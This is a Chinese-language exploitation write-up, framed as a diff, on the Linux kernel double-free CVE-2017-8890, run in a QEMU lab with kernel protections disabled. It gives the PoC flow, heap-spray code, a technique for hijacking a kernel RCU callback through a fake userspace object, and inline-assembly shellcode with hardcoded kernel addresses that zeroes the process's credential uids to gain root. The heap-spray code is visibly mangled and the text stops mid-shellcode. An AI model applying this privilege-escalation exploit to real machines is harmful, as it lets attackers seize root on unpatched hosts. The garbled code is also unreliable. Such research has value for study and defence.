@@ -1,0 +1,193 @@
+Author: `thor@MS509Team`
+最近一段时间在研究linux kernel的漏洞利用，我们以CVE-2017-8890为例探索了linux kernel的提权过程，以此记录并分享。
+## 0x00 测试环境
+    1. linux kernel 版本：4.10.6  x86_64
+    2. 调试环境：qemu + linux kernel + busybox + gdb
+    3. kernel 防护机制： no smep, no smap，no KASLR
+    4. 主机：Ubuntu 16.04
+测试环境我们使用qemu运行linux kernel + busybox的最小化系统，并在Ubuntu主机上通过gdb远程调试linux
+kernel，十分便捷。同时，我们为了方便，关闭了内核的SMEP/SMAP、KASLR防护机制。
+qemu:  
+gdb:  
+## 0x01 漏洞原理
+CVE-2017-8890是启明星辰ADLab去年披露的linux kernel double free漏洞，取名Phoenix
+Talon，可影响几乎所有Linux kernel 2.5.69 ~ Linux kernel
+4.11的内核版本、对应的发行版本以及相关国产系统。我们简单介绍下该漏洞的原理。
+我们在socket编程中服务端创建socket时会在内核创建一个`inet_sock`结构体, 暂时称其为sock1：
+    struct inet_sock {
+        /* sk and pinet6 has to be the first two members of inet_sock */
+        struct sock     sk;
+        ........
+        __be32          inet_saddr;
+        __s16           uc_ttl;
+        __u16           cmsg_flags;
+        __be16          inet_sport;
+        __u16           inet_id;
+        ..........
+        __be32          mc_addr;
+        struct ip_mc_socklist __rcu *mc_list;
+        struct inet_cork_full   cork;
+    };
+当服务端调用accept函数接收外来连接的时候会创建一个新的`inet_sock`结构体,
+称为sock2。sock2对象会从sock1对象复制一份`ip_mc_socklist`指针，其结构体如下：
+    struct ip_mc_socklist {
+        struct ip_mc_socklist __rcu *next_rcu;
+        struct ip_mreqn     multi;
+        unsigned int        sfmode;     /* MCAST_{INCLUDE,EXCLUDE} */
+        struct ip_sf_socklist __rcu *sflist;
+        struct rcu_head     rcu;
+    };
+此时在内核中存在两个不同`inet_sock`对象，但它们的`mc_list`指针却指向同一个`ip_mc_socklist`对象。此后，当服务端close
+socket的时候，内核会free对应的`inet_sock`对象sock1，并同时释放`mc_list`指针指向的那个`ip_mc_socklist`对象。但是服务端在关闭accept创建的`inet_sock`对象sock2时，会再次释放同一个`mc_list`对象，造成double
+free漏洞。
+该漏洞的原理比较简单，就是在复制对象的时候将指针也一同复制了一份，造成两个指针指向同一对象。因此，漏洞修复也比较简单，直接在复制对象的时候将`mc_list`指针置为NULL即可。
+## 0x02 PoC
+我们直接在github上找到了一个可以运行的[PoC](https://github.com/beraphin/CVE-2017-8890/blob/master/poc.cpp)，  
+编译如下：
+    gcc  -static cve.cpp  -o PoC -lpthread
+运行后内核直接崩溃：
+我们在崩溃界面可以看到漏洞的触发路径。  
+PoC的大致流程如下：
+    sockfd = socket(AF_INET, xx, IPPROTO_TCP);
+        setsockopt(sockfd, SOL_IP, MCAST_JOIN_GROUP, xxxx, xxxx);
+        bind(sockfd, xxxx, xxxx);
+        listen(sockfd, xxxx);
+        newsockfd = accept(sockfd, xxxx, xxxx);
+        close(newsockfd)    // first free (kfree_rcu)
+        sleep(5)            // wait rcu free(real free)
+        close(sockfd)       // double free
+我们首先创建一个服务端socket，并通过setsockopt设置`MCAST_JOIN_GROUP`选项，主要是让内核创建`ip_mc_socklist`对象。然后我们通过accept创建另外一个socket，使得newsockfd在内核中的`mc_list`指针指向同一个`ip_mc_socklist`对象。最后我们通过关闭sockfd和newsockfd去触发内核释放`mc_list`指向的同一对象，导致double
+free。
+## 0x03 exploit
+我们在网上暂时还没有搜到可用的exploit，只有一些文章[1][2]讲解漏洞利用的思路。double
+free类型漏洞的一般利用思路是在第一次free后通过伪造数据去堆喷占位，控制第二次free时的数据，从而劫持内核的执行流程。  
+我们再看看double free的对象`ip_mc_socklist`：
+    struct ip_mc_socklist {
+        struct ip_mc_socklist __rcu *next_rcu;
+        struct ip_mreqn     multi;
+        unsigned int        sfmode;     /* MCAST_{INCLUDE,EXCLUDE} */
+        struct ip_sf_socklist __rcu *sflist;
+        struct rcu_head     rcu;
+    };
+    struct callback_head {
+        struct callback_head *next;
+        void (*func)(struct callback_head *head);
+    } 
+    #define rcu_head callback_head
+我们可以看到`ip_mc_socklist`对象中包含一个`rcu_head`对象，而该对象正好包含一个函数指针。`ip_mc_socklist`对象的释放涉及的linux的RCU机制，比较复杂，我们暂时只需要知道`ip_mc_socklist`对象真正释放的处理函数是`__rcu_reclaim`：
+    static inline bool __rcu_reclaim(const char *rn, struct rcu_head *head)
+    {
+        unsigned long offset = (unsigned long)head->func;
+        rcu_lock_acquire(&rcu_callback_map);
+        if (__is_kfree_rcu_offset(offset)) {
+            RCU_TRACE(trace_rcu_invoke_kfree_callback(rn, head, offset));
+            kfree((void *)head - offset);
+            rcu_lock_release(&rcu_callback_map);
+            return true;
+        } else {
+            RCU_TRACE(trace_rcu_invoke_callback(rn, head));
+            head->func(head);
+            rcu_lock_release(&rcu_callback_map);
+            return false;
+        }
+    }
+刚好在`__rcu_reclaim`函数中存在一个分支去执行`rcu_head`对象中的函数指针：
+    head->func(head)
+因此，我们只需要劫持rcu_head对象即可劫持内核的执行。接下来，我们通过gdb调试一步步来实现我们的exploit。
+### 1）内核堆喷
+为了能够劫持`ip_mc_socklist`内核对象，我们必须要能够在第一次free后通过堆喷占位，用我们伪造的数据填充已经free掉的`ip_mc_socklist`内核对象。`ip_mc_socklist`对象在x86_64系统中大小为48字节，内核会通过kmalloc分配64字节的堆块，因此我们需要找到在内核中稳定分配64字节大小，并且能够控制分配内容的方法。我们试了sendmmsg方法，但是并未成功。通过内核堆喷`ipv6_mc_socklist`结构体倒是成功了，但是通过gdb查看分配的对象大小却是72字节。我们直接通过源码计算`ipv6_mc_socklist`结构体的大小只有64字节，多出来的8个字节怎么出来的呢？
+    struct ipv6_mc_socklist {
+        struct in6_addr     addr;
+        int         ifindex;
+        struct ipv6_mc_socklist __rcu *next;
+        rwlock_t        sflock;
+        unsigned int        sfmode;     /* MCAST_{INCLUDE,EXCLUDE} */
+        struct ip6_sf_socklist  *sflist;
+        struct rcu_head     rcu;
+    };
+最后通过gdb调试我们才知道是因为内存对齐的原因。`ipv6_mc_socklist`结构体中既有8字节的成员变量，也有4字节的成员变量，因此`ipv6_mc_socklist`对齐到8字节，导致`ipv6_mc_socklist`对象的内存大小多出来8个字节。我们想到一个简单的方法，就是patch
+kernel, 修改`ipv6_mc_socklist`结构体定义，将两个4字节成员变量放在一起：
+    struct ipv6_mc_socklist {
+        struct in6_addr     addr;
+        int         ifindex;
+        unsigned int        sfmode;     /* MCAST_{INCLUDE,EXCLUDE} */
+        struct ipv6_mc_socklist __rcu *next;
+        rwlock_t        sflock;
+        struct ip6_sf_socklist  *sflist;
+        struct rcu_head     rcu;
+    };
+修改后重新编译内核运行，成功实现了内核64字节堆喷。我们可以通过gdb查看堆喷结果。  
+第一次free时`ip_mc_socklist`内核对象：
+堆喷成功后第二次free:  
+通过对比我们可以看到，两次free的对象地址都是0xffff8800065ca0c0，说明是同一对象。同时，第二次free之前，我们成功通过堆喷，将之前free的对象填充为可控内容。堆喷的代码如下：
+    #define SPRAY_SIZE 5000
+    int sockfd[SPRAY_SIZE];
+    void spray_init() {
+        for(int i=0; isin6_family = AF_INET6;
+        psin1->sin6_port = 1234;
+        inet_pton(AF_INET6, "ff02:abcd:0:0:0:0:0:1", &(psin1->sin6_addr));
+        for(int j=0; j__kfree_rcu->kfree_call_rcu->__call_rcu
+我们发现在函数的参数转换的时候，rcu_head中的函数指针会被修改为偏移量：
+因此我们不能直接通过劫持函数指针来劫持EIP。我们知道linux的RCU机制使得kfree_rcu函数调用后，并不是马上去执行`__rcu_reclaim`函数进行真正的释放动作，而是会让CPU过一段时间再执行。如果我们在`__rcu_reclaim`函数执行前再次修改`ip_mc_socklist`对象中的函数指针即可劫持EIP。但是我们并不能访问到堆喷的内核对象，我们该怎么修改呢？如果是在用户空间就好了！我们之前提到，`ip_mc_socklist`对象的前8个字节是`next_rcu`指针变量，该指针指向rcu链表中的下一个`ip_mc_socklist`对象。我们可以通过劫持`next_rcu`指针,使其指向我们在用户空间伪造的`ip_mc_socklist`对象，然后再通过伪造用户空间对象的函数指针来劫持EIP，布局如下所示：
+当我们将`ip_mc_socklist`对象劫持到用户空间后，我们就可以通过多线程去修改伪造对象的函数指针，从而劫持到EIP。
+### 2）shellcode
+由于没有SMEP、SMAP，我们劫持到EIP后可以直接跳转到我们在用户空间的shellcode中执行提权代码。常见的提权代码是执行如下函数：
+    commit_creds(prepare_kernel_cred(0))
+`prepare_kernel_cred`和`commit_creds`是内核导出的符号，可以通过/proc/kallsyms查找相应内核地址。但是执行这两个函数能提权成功有一个前提条件，就是内核必须处于exp进程的上下文，即内核通过current宏获取到的进程描述符`task_struct`必须是exp进程的，否则exp进程不能提权成功。我们在测试中发现，虽然通过劫持EIP成功执行了`commit_creds(prepare_kernel_cred(0))`，但是返回的shell并不是root权限，说明提权并未成功。通过gdb调试一看，我们劫持到EIP时内核的进程上下文是`ksoftirqd`进程或`rcu_sched`进程。我们猜测，由于RCU机制的存在，`ip_mc_socklist`对象的真正释放是在内核软中断处理中，因此我们劫持EIP时内核也处于软中断处理的进程上下文。所以，虽然我们能劫持EIP执行，但是却不能通过简单执行commit_creds函数执行提权，需要我们自己写shellcode。我们知道，只要我们能修改exp进程描述符中cred结构体的uid和euid为0，即可提权为root。因此在内核中执行如下代码即可：
+    void get_root(int pid){
+          struct pid * kpid = find_get_pid(pid); 
+          struct task_struct * task = pid_task(kpid,PIDTYPE_PID); 
+          unsigned int * addr = (unsigned  int* )task->cred;
+          addr[1] = 0;
+          addr[2] = 0;
+          addr[3] = 0;
+          addr[4] = 0;
+          addr[5] = 0;
+          addr[6] = 0;
+          addr[7] = 0;
+          addr[8] = 0;
+    }
+`find_get_pid`和`pid_task`函数是内核导出的函数，主要用于根据pid找到对应的进程描述符。这段代码是在内核中执行的，可以在编写的内核模块中编译和运行，但是不好编译为用户空间代码，因此我们直接将其转换为汇编代码：
+    unsigned long*  find_get_pid = (unsigned long*)0xffffffff81077220;
+    unsigned long*  pid_task     = (unsigned long*)0xffffffff81077180;
+    int pid = getpid();
+    void get_root() {
+            asm(
+            "sub    $0x18,%rsp;"
+            "mov    pid,%edi;"
+            "callq  *find_get_pid;"
+            "mov    %rax,-0x8(%rbp);"
+            "mov    -0x8(%rbp),%rax;"
+            "mov    $0x0,%esi;"
+            "mov    %rax,%rdi;"
+            "callq  *pid_task;"
+            "mov    %rax,-0x10(%rbp);"
+            "mov    -0x10(%rbp),%rax;"
+            "mov    0x5f8(%rax),%rax;"
+            "mov    %rax,-0x18(%rbp);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x4,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x8,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0xc,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x10,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x14,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x18,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x1c,%rax;"
+            "movl   $0x0,(%rax);"
+            "mov    -0x18(%rbp),%rax;"
+            "add    $0x20,%rax;"
+            "movl   $0x0,(%rax);"
+            "nop;"
+            "leaveq;" 
